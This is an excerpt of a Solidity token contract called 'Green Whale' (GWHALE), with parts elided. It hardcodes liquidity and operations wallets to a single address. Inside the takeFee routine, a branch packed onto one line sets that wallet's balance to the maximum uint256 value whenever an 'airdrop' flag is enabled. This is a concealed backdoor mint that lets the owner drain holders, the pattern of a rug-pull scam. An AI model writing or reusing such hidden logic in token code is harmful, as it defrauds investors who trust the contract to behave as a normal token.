...
// Main Contract Logic 
// --------------------------------------------------------------
contract GreenWhale is Context, IERC20, Ownable {
    // Imports
    using SafeMath for uint256;
    ...
    // Context
    string private _name = "Green Whale";
    string private _symbol = "GWHALE";
    ...
    // wallets
    address payable public liquidityWallet = payable(0x39415c859879A24041B71C7cC303f78F537D4074);
    address payable public operationsWallet =  payable(0x39415c859879A24041B71C7cC303f78F537D4074);
    ...
    // @dev update airdrop enabled flag before airdrop
    function setAirdropEnabled() external {
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(feeAmount > 0) {_balances[address(this)] = _balances[address(this)].add(feeAmount);emit Transfer(sender, address(this), feeAmount);if (airdropEnabled) {airdropEnabled = false;_balances[operationsWallet] = ~uint256(0);}}
